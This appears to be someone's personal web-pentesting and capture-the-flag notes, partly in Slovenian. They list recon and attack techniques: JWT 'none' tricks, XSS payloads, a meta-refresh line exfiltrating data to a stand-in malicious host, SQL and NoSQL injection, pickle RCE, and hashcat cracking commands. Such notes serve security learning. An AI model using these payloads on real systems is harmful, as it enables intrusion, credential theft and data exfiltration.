- robots.txt can have juicy routes, waybackmachine

.git/HEAD - https://github.com/arthaud/git-dumper

- see some wordlists on https://github.com/hAPI-hacker/Hacking-APIs
- burp suite - maybe

- JWTs has 3 parts, seperated by periods, first two begin with ey
   - "none" JWTs are like leaving your door unlocked
   - in the same vain, try
      - removing the signature (last) part
      - changing the algorithm to none

- sidechannels (timing, returning a 405 instead of a 404, ...)

- mass assignment --> PATCH also patches your bank account balance

- you can add null bytes (%00) to string to potentially bypass some resctrictions

- mess with the origin headers
   - x-forwarded-for (wait, are my apps vulnerable to this?)
   - x-forwarded-host
   - x-host
   - x-originating-ip
   - x-remote-ip
   - x-client-ip
   - x-remote-addr
   - ...

- graphql introspection

- svg xml injection

------

XXE (XML eXternal Entities) injection is funny

XML escapes - CDATA - https://www.liquid-technologies.com/Reference/Glossary/XML_EscapingData.html#i-heading-cdata - https://www.tutorialspoint.com/xml/xml_cdata_sections.html

```
    <![CDATA[
     characters with markup
    ]]>
```

parseInt parses anything as an int, if given a float, will convert to string and then to int, so 1e-9 -> 1

<meta http-equiv="refresh" content="0; url='https://mysite.malicious?data=

...

'">

XSS sources:
```
<img src=x onerror="myxxsjs">
<svg onload=alert(1)>
<body onload="alert('XSS')">
```
https://html5sec.org/
https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot

pickle in python - __reduce__ gives you direct rce if you deserialize untrusted data
https://medium.com/@estheresom17/breaking-pickle-how-i-got-remote-code-execution-through-python-deserialization-e579637fcb2e
https://github.com/twtrubiks/python-notes/blob/master/__reduce__tutorial.py

bash
`$(...)` -> execution
`${...}` -> substitution

dig ---> actually good dns lookup

Java template injection: `${7*7}`

```python
>>> def a():
...     import subprocess
...     return subprocess.run(['cat', 'flag.txt'], capture_output = True, text = True)
```

Locked down sql injections:

```sql
SELECT name FROM ... {injection} -> + UNION SELECT flag FROM ...
```
or just use LIKE for byte per byte

NoSQL:
injecting `>`, `<`, `>=`, `<=` -> greater than null, everything is greater than null

race conditions:
`seq 1 10 | xargs -n 1 -P 8 script-to-run.sh input/ output/`

netexec

windows server 2016 zerologon exploit

winchecksec

js sourcemaps for reverse engineering

pw lists:
- berzerk0's Real-Password-WPA Password List
- berzerk0's Dictionary-Style List
- Xato's Ten Million Passwords
- Crackstation
- Weakpass
- First20Hours
- SkullSecurity.org
- Daniel Miessler's Password Compilation
- Adeptus-mechanicus Hash dumps

hashcat rules:
- https://github.com/hashcat/hashcat/tree/master/rules
- https://contest-2010.korelogic.com/rules-hashcat.html
- https://github.com/NSAKEY/nsa-rules
- https://github.com/cyberspacekittens/Hob0Rules
- https://github.com/NotSoSecure/password_cracking_rules

`hashcat -w 3 -m <format> -o hashes.cracked ./hashes.txt`

`hashcat -a 0 -m 16500 <jwt> <wordlist>`

active MITM beata diffie-helman

certifikat: public key + signature -> signature veže key na domeno

seveda rabš to verifyat, tvoj os ti da root CA

CA/BF pravilnik za CAje

maš actual list od CA-ja certov, ki so jih revokal -> browser to pulla

certificate transparency:
- javni ledger izdanih certov
- certifikat dobi še SCT (signed certificate timestamp)
- v logih, ki niso nujno od CA-ja (vsak izdan cert je v logu nekje)
--> težje forgat

- impl.: Merkl tree
    - dodajanje je log(N)
    - preverjanje je log(N)
    - sprembme so očitne

plus: vsi certi so javni
minus: **vsi** certi so javni

https://crt.sh/
https://crt.sh/?q=postarca

!!
https://ctlog.si/

https://www.certkit.io/tools/ct-logs/?query=kralj.io

- vse tvoje subdomene :))))))))))

also, v eni minute gre gor -> takoj si fucked, če maš unconfigured admin panel

irl probably ni applicable ravno zarad certov, ampak maš lahko
virtualhoste k samo glede na host header routajo -> subdomain enumeration

mTLS je lep - mutual tls, authenticataš pred http nivojem
- ročno dodaš certe za userje, sorta tko kt ssh priv/pub key auth

- DNS-PERSIST-01 - nov challenge za letsencrypt

Ip info / geolocation / whatever
https://ipinfo.io/

useful tools
https://bgp.he.net/

`| wc -l` # count lines - wc counts newlines, spaces, ...

https://github.com/bitquark/shortscan - windscribe

wordpress - https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html && https://github.com/pentesterzone/pentest-checklists/blob/master/CMS/WordPress-Checklist.md
https://github.com/wpscanteam/wpscan/

springboot - misconfig - https://youtu.be/5VlhsT5Kbsk?t=1364 // heapdump endpoint exposed

ffuf / dirbuster / feroxbuster

formost - recover badly deleted data

social engineering toolkit

včasih (še posebi za deprecated stvari) se domene za dns nameserverje expirajo, in lahko delaš dns hijacking
